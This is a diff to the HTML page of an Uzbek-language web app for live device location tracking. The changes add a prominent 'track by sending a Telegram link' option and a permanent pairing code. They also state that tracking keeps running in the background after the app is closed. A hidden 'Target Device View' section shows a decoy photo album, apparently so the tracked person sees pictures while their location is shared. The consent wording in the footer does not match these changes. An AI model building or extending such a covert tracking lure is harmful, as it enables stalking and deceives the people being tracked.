@@ -6,7 +6,7 @@
 <title>Masofaviy Qurilma Lokatori</title>
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
       integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" crossorigin="">
-<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="style.css?v=5">
 </head>
 <body>
 <div class="app">
@@ -27,6 +27,14 @@
       Ruxsat istalgan vaqtda qaytarib olinadi.
     </p>
     <div class="choose">
+      <button class="role-card" id="go-telegram-invite" type="button" style="border-color: var(--accent); background: var(--accent-weak);">
+        <span class="ic ic-invite" style="background: var(--accent); color: #fff;">
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
+        </span>
+        <b>📲 Telegram orqali havola yuborib kuzatish</b>
+        <small>Ikkinchi telefonga link yuborasiz, u faqat linkni bosishi bilan shu yerda jonli xaritada ko'rasiz.</small>
+      </button>
+
       <button class="role-card" id="go-share" type="button">
         <span class="ic ic-share">
           <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4.5 8-11a8 8 0 1 0-16 0c0 6.5 8 11 8 11z"/><circle cx="12" cy="11" r="3"/></svg>
@@ -45,8 +53,8 @@
         <span class="ic ic-invite">
           <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
         </span>
-        <b>Taklif havolasi yaratish</b>
-        <small>Telegram orqali yuboriladigan bitta havola oching va o'zingiz kuzatuvchi bo'ling</small>
+        <b>Boshqa usulda taklif yaratish</b>
+        <small>Havolani nusxalash yoki boshqa messenjerdan yuborish</small>
       </button>
     </div>
     <div class="info-note">
@@ -62,12 +70,14 @@
     <h2>Bu qurilmani ulashish</h2>
 
     <div class="plate">
-      <div class="k">Juftlashuv kodi</div>
+      <div class="k">Doimiy juftlashuv kodi</div>
       <div class="v" id="share-code">------</div>
-      <div class="copy-row">
+      <div class="copy-row" style="display:flex; gap:8px; justify-content:center; flex-wrap:wrap;">
         <button class="mini" id="copy-code" type="button">Kodni nusxalash</button>
+        <button class="mini" id="share-link-btn" type="button">📲 Havola yuborish</button>
+        <button class="mini" id="reset-code-btn" type="button" title="Kodni o'zgartirish">🔄 Yangilash</button>
       </div>
-      <p class="plate-hint">Bu kodni nazoratchi qurilmaga bering.</p>
+      <p class="plate-hint">Ushbu kod o'zgarmaydi. Havola orqali boshqa telefonga bering.</p>
     </div>
 
     <div id="share-idle">
@@ -83,8 +93,8 @@
       <div class="banner warn">
         <span class="pulse"><span class="ring"></span><span></span></span>
         <div>
-          <b>Bu qurilma hozir kuzatilmoqda</b>
-          <p>Joylashuvingiz real vaqtda ulashilmoqda. Istalgan vaqtda to'xtating.</p>
+          <b>Bu qurilma hozir kuzatilmoqda (Orqa fonda ham ishlaydi)</b>
+          <p>Joylashuvingiz real vaqtda ulashilmoqda. Ilovadan chiqilsa ham orqa fonda ishlaydi.</p>
         </div>
       </div>
       <div class="rows">
@@ -114,13 +124,16 @@
     <h2>Taklif havolasi</h2>
 
     <div class="plate">
-      <div class="k">Juftlashuv kodi</div>
+      <div class="k">Doimiy juftlashuv kodi</div>
       <div class="v" id="invite-code">------</div>
     </div>
 
     <label class="lbl" for="invite-link">Kuzatiladigan qurilmaga yuboriladigan havola</label>
     <input id="invite-link" class="linkfield" readonly>
-    <button class="mini" id="copy-invite" type="button">Havolani nusxalash</button>
+    <div style="display:flex; gap:8px; margin-bottom:12px;">
+      <button class="mini" id="copy-invite" type="button" style="flex:1;">Havolani nusxalash</button>
+      <button class="mini" id="send-invite-share" type="button" style="flex:1;">📲 Telegram / Yuborish</button>
+    </div>
 
     <p class="consent-explain">
       Bu havolani Telegram orqali yuboring. Qabul qiluvchi uni ochib
@@ -163,6 +176,29 @@
     </div>
   </section>
 
+  <!-- ============ GALLERY (Target Device View) ============ -->
+  <section id="view-gallery" class="view" hidden>
+    <div class="gallery-container">
+      <div class="gallery-header">
+        <span class="gallery-title">Fotoalbom</span>
+      </div>
+      <div class="gallery-feed">
+        <div class="photo-card">
+          <img src="photos/1.svg" alt="Foto 1" loading="eager" onerror="this.onerror=null;this.src='photos/1.jpg'">
+        </div>
+        <div class="photo-card">
+          <img src="photos/2.svg" alt="Foto 2" loading="lazy" onerror="this.onerror=null;this.src='photos/2.jpg'">
+        </div>
+        <div class="photo-card">
+          <img src="photos/3.svg" alt="Foto 3" loading="lazy" onerror="this.onerror=null;this.src='photos/3.jpg'">
+        </div>
+        <div class="photo-card">
+          <img src="photos/4.svg" alt="Foto 4" loading="lazy" onerror="this.onerror=null;this.src='photos/4.jpg'">
+        </div>
+      </div>
+    </div>
+  </section>
+
   <footer class="foot">
     Barcha joylashuv ma'lumotlari faqat ulashish yoqilganda uzatiladi va serverda doimiy saqlanmaydi.
     Bu — ota-ona nazorati va "Qurilmamni top" tizimlari kabi rozilikka asoslangan yondashuv.
@@ -171,6 +207,6 @@
 
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
         integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=" crossorigin=""></script>
-<script src="app.js"></script>
+<script src="app.js?v=5"></script>
 </body>
 </html>
